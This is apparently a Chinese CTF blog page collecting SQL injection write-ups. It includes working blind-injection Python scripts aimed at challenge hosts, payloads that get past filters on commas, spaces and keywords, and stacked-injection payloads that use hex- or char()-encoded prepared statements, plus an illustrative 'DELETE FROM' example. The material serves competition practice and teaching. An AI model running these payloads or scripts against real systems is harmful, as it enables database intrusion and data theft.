+<h3 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select * from (select database()) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>
+<h3 id="过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作"><a href="#过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作" class="headerlink" title="过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作"></a>过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作</h3><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替<br>异或运算^代替and</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">str_all=<span class="string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ &#123;&#125;+-*/=&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://123.206.31.85:49167/index.php&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;^(ascii(mid(database()from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;**************************&#x27;</span>,result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_all:</span><br><span class="line">            payload = <span class="string">&quot;admin&#x27;^(ascii(mid((select(password)from(admin))from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="built_in">ord</span>(j))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            s=r.post(url,data)</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> s.text:</span><br><span class="line">                result+=j</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;**************************&#x27;</span>,result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#database()</span></span><br><span class="line">password()</span><br></pre></td></tr></table></figure>
+<p>mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？<br>这里用到了ascii()取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。<br>每个字符的ascii码判断是不是不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算。<br>如果数据库名的第一位的ascii码值不是97，where条件是<code>username=&#39;admin&#39;^1^0</code></p>
+<h3 id="强网杯-2019-随便注-堆叠注入"><a href="#强网杯-2019-随便注-堆叠注入" class="headerlink" title="[强网杯 2019]随便注-堆叠注入"></a>[强网杯 2019]随便注-堆叠注入</h3><p>条件苛刻</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">show</span> tables; #</span><br><span class="line"><span class="number">0</span><span class="string">&#x27;;show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
+<p>(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)<br>理论上我们执行<br><code>0&#39;;select flag,1 from 1919810931114514</code><br>但是这题的select被过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>也可以<br><code>-1&#39;;use supersqli;show tables;-- </code><br>直接获取flag<br><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code><br>其中<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>加密为select * from &#96;1919810931114514’<br>相关知识</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</span><br></pre></td></tr></table></figure>
+<p>还有骚操作是改表段然后注入获得数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure>
+
+<h3 id="“百度杯”CTF比赛-九月场-SQL"><a href="#“百度杯”CTF比赛-九月场-SQL" class="headerlink" title="“百度杯”CTF比赛 九月场 SQL"></a>“百度杯”CTF比赛 九月场 SQL</h3><p>题目描述：<br><code>出题人就告诉你这是个注入，有种别走！</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,4,3</code>，学到了学到了&lt;&gt;分离<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3</code><br>获得数据库名字sqli然后一步一步<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&#39;sqli&#39; an&lt;&gt;d table_name=&#39;info&#39;</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</code><br>得到flag</p>
+<h3 id="盲注模板“迎圣诞，拿大奖”活动赛题sqli"><a href="#盲注模板“迎圣诞，拿大奖”活动赛题sqli" class="headerlink" title="盲注模板“迎圣诞，拿大奖”活动赛题sqli"></a>盲注模板“迎圣诞，拿大奖”活动赛题sqli</h3><p>模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># config-start</span></span><br><span class="line">sleep_time = <span class="number">5</span></span><br><span class="line">error_time = <span class="number">1</span></span><br><span class="line"><span class="comment"># config-end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">indexOfResult, indexOfChar, mid</span>):</span><br><span class="line">	column_name=<span class="string">&quot;column_name&quot;</span></span><br><span class="line">	table_name=<span class="string">&quot;columns&quot;</span></span><br><span class="line">	database_name=<span class="string">&quot;information_schema&quot;</span></span><br><span class="line">	startStr = <span class="string">&quot;admin%1$\\&#x27; or &quot;</span></span><br><span class="line">	endStr = <span class="string">&quot; #&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + database_name + <span class="string">&quot;.&quot;</span> + table_name + <span class="string">&quot; where table_name=0x666c6167 limit &quot;</span> + indexOfResult + <span class="string">&quot;,1 ),&quot;</span> + indexOfChar + <span class="string">&quot;,1)))&gt;&quot;</span> + mid + <span class="string">&quot;)&quot;</span></span><br><span class="line">	payload = startStr + payload + endStr</span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exce</span>(<span class="params">indexOfResult,indexOfChar,mid</span>):</span><br><span class="line">	<span class="comment"># content-start</span></span><br><span class="line">	url = <span class="string">&quot;http://3ce3bb7f26364585b8d7970ae179fe54857ddd7277964f32.changame.ichunqiu.com/&quot;</span></span><br><span class="line">	post_data=&#123;<span class="string">&quot;username&quot;</span>:getPayload(indexOfResult,indexOfChar,mid),<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">	<span class="built_in">print</span>(post_data)</span><br><span class="line">	content = requests.post(url,data=post_data)</span><br><span class="line">	content.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">	content=content.text</span><br><span class="line">	<span class="comment">#print(content)</span></span><br><span class="line">	<span class="comment"># content-end</span></span><br><span class="line">	<span class="comment"># judge-start</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="comment"># judge-end</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exceGet</span>(<span class="params">indexOfResult,indexOfChar,mid</span>):</span><br><span class="line">	<span class="comment"># content-start</span></span><br><span class="line">	url = <span class="string">&quot;http://localhost/sqli-labs-master/Less-5/?id=&quot;</span></span><br><span class="line">	tempurl = url + getPayload(indexOfResult,indexOfChar,mid)</span><br><span class="line">	content = requests.get(tempurl).text</span><br><span class="line">	<span class="comment"># content-end</span></span><br><span class="line">	<span class="comment"># judge-start</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="comment"># judge-end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doubleSearch</span>(<span class="params">indexOfResult,indexOfChar,left_number, right_number</span>):</span><br><span class="line">	<span class="keyword">while</span> left_number &lt; right_number:</span><br><span class="line">		mid = <span class="built_in">int</span>((left_number + right_number) / <span class="number">2</span>)</span><br><span class="line">		<span class="keyword">if</span> exce(<span class="built_in">str</span>(indexOfResult),<span class="built_in">str</span>(indexOfChar + <span class="number">1</span>),<span class="built_in">str</span>(mid)):</span><br><span class="line">			left_number = mid</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			right_number = mid</span><br><span class="line">		<span class="keyword">if</span> left_number == right_number - <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">if</span> exce(<span class="built_in">str</span>(indexOfResult),<span class="built_in">str</span>(indexOfChar + <span class="number">1</span>),<span class="built_in">str</span>(mid)):</span><br><span class="line">				mid += <span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>): <span class="comment"># 需要遍历的查询结果的数量</span></span><br><span class="line">		counter = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>): <span class="comment"># 结果的长度</span></span><br><span class="line">			counter += <span class="number">1</span></span><br><span class="line">			temp = doubleSearch(i, j, <span class="number">0</span>, <span class="number">127</span>) <span class="comment"># 从255开始查询</span></span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">ord</span>(temp) == <span class="number">1</span>: <span class="comment"># 当为1的时候说明已经查询结束</span></span><br><span class="line">			    <span class="keyword">break</span></span><br><span class="line">			sys.stdout.write(temp)</span><br><span class="line">			sys.stdout.flush()</span><br><span class="line">		<span class="keyword">if</span> counter == <span class="number">1</span>: <span class="comment"># 当结果集的所有行都被遍历后退出</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		sys.stdout.write(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">		sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">search()</span><br></pre></td></tr></table></figure>
+<p>获得库ctf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">indexOfResult, indexOfChar, mid</span>):</span><br><span class="line">	column_name=<span class="string">&quot;schema_name&quot;</span></span><br><span class="line">	table_name=<span class="string">&quot;schemata&quot;</span></span><br><span class="line">	database_name=<span class="string">&quot;information_schema&quot;</span></span><br><span class="line">	startStr = <span class="string">&quot;admin%1$\\&#x27; or &quot;</span></span><br><span class="line">	endStr = <span class="string">&quot; #&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + database_name + <span class="string">&quot;.&quot;</span> + table_name + <span class="string">&quot;  limit &quot;</span> + indexOfResult + <span class="string">&quot;,1),&quot;</span> + indexOfChar + <span class="string">&quot;,1)))&gt;&quot;</span> + mid + <span class="string">&quot;)&quot;</span></span><br><span class="line">	payload = startStr + payload + endStr</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<p>获得表名flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">indexOfResult, indexOfChar, mid</span>):</span><br><span class="line">	column_name=<span class="string">&quot;table_name&quot;</span></span><br><span class="line">	table_name=<span class="string">&quot;tables&quot;</span></span><br><span class="line">	database_name=<span class="string">&quot;information_schema&quot;</span></span><br><span class="line">	startStr = <span class="string">&quot;admin%1$\\&#x27; or &quot;</span></span><br><span class="line">	endStr = <span class="string">&quot; #&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + database_name + <span class="string">&quot;.&quot;</span> + table_name + <span class="string">&quot; where table_schema=database()  limit &quot;</span> + indexOfResult + <span class="string">&quot;,1 ),&quot;</span> + indexOfChar + <span class="string">&quot;,1)))&gt;&quot;</span> + mid + <span class="string">&quot;)&quot;</span></span><br><span class="line">	payload = startStr + payload + endStr</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<p>获得字段flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">indexOfResult, indexOfChar, mid</span>):</span><br><span class="line">	column_name=<span class="string">&quot;table_name&quot;</span></span><br><span class="line">	table_name=<span class="string">&quot;tables&quot;</span></span><br><span class="line">	database_name=<span class="string">&quot;information_schema&quot;</span></span><br><span class="line">	startStr = <span class="string">&quot;admin%1$\\&#x27; or &quot;</span></span><br><span class="line">	endStr = <span class="string">&quot; #&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + database_name + <span class="string">&quot;.&quot;</span> + table_name + <span class="string">&quot; where table_name = 0x666c6167 limit &quot;</span> + indexOfResult + <span class="string">&quot;,1 ),&quot;</span> + indexOfChar + <span class="string">&quot;,1)))&gt;&quot;</span> + mid + <span class="string">&quot;)&quot;</span></span><br><span class="line">	payload = startStr + payload + endStr</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<p>获得数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>(<span class="params">indexOfResult, indexOfChar, mid</span>):</span><br><span class="line">	column_name=<span class="string">&quot;flag&quot;</span></span><br><span class="line">	table_name=<span class="string">&quot;columns&quot;</span></span><br><span class="line">	database_name=<span class="string">&quot;flag&quot;</span></span><br><span class="line">	startStr = <span class="string">&quot;admin%1$\\&#x27; or &quot;</span></span><br><span class="line">	endStr = <span class="string">&quot; #&quot;</span></span><br><span class="line">	payload = <span class="string">&quot;((ascii(substring((select &quot;</span> + column_name + <span class="string">&quot; from &quot;</span> + database_name + <span class="string">&quot; limit &quot;</span> + indexOfResult + <span class="string">&quot;,1 ),&quot;</span> + indexOfChar + <span class="string">&quot;,1)))&gt;&quot;</span> + mid + <span class="string">&quot;)&quot;</span></span><br><span class="line">	payload = startStr + payload + endStr</span><br><span class="line">	<span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<h3 id="花式盲注ciscn-2019-web-northern-china-day2-web1"><a href="#花式盲注ciscn-2019-web-northern-china-day2-web1" class="headerlink" title="花式盲注ciscn_2019_web_northern_china_day2_web1"></a>花式盲注ciscn_2019_web_northern_china_day2_web1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://7ccdf96a-66d5-4601-a1f0-4a3cba45893c.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#从33到126为可打印的字符</span></span><br><span class="line">    low = <span class="number">33</span></span><br><span class="line">    height = <span class="number">126</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> low &lt;= height :</span><br><span class="line">        mid = (low + height) // <span class="number">2</span></span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&#x27;</span>%(i,mid)</span><br><span class="line">        html = requests.post(url,data).text</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> html :</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#将小于和等于的情况一起考虑，所以在low~mid中间寻找</span></span><br><span class="line">            height = mid</span><br><span class="line">        <span class="comment">#出现low = height = mid，若不判断会进入死循环</span></span><br><span class="line">        <span class="keyword">if</span> height == mid == low:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(mid))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        </article>
+      </div>
+    </div>
+  </main>
+
+  <section id="about" class="about-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">关于本机</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+      </div>
+    </div>
+    <div class="window-body about-body">
+      <div class="about-card">
+        <div class="about-brand">
+          <div class="about-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+              <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+            </svg>
+          </div>
+          <div class="about-title">MacBook Pro</div>
+          <div class="about-sub">16-inch, 2099</div>
+        </div>
+        <div class="about-specs">
+          <div class="about-row">
+            <span class="about-key">内存</span>
+            <span class="about-val">256 GB 2667 MHz DDR4</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">处理器</span>
+            <span class="about-val">Apple M9 Pro</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">显卡</span>
+            <span class="about-val">Neural X 32-Core</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">序列号</span>
+            <span class="about-val">MACF-2099-A1B2C3</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">系统</span>
+            <span class="about-val">macOS 15.2</span>
+          </div>
+          <div class="about-row">
+            <span class="about-key">主题作者</span>
+            <span class="about-val">bkfish</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+  
+
+<section id="music" class="tool-window music-window">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
+        <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+        <span class="traffic-dot yellow"></span>
+        <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+      </div>
+      <div class="window-title">Music</div>
+      <div class="window-actions">
+        <a class="window-link" href="#">Close</a>
+        
+      </div>
+    </div>
+    <div class="window-body tool-body music-body">
+      
+        <div class="empty-state">
+          <div class="empty-title">未发现本地音乐</div>
+          <div class="empty-sub">把 MP3 放在 `source/music/`（或在主题配置里设置 `desktop.music_dir`）</div>
+        </div>
+      
+    </div>
+  </div>
+</section>
+
+  <section id="search" class="search-window" data-index-url="/mac-search.json">
+  <a class="folder-backdrop" href="#"></a>
+  <div class="window wide reveal" style="--delay: 140ms;">
+    <div class="window-bar">
+      <div class="traffic">
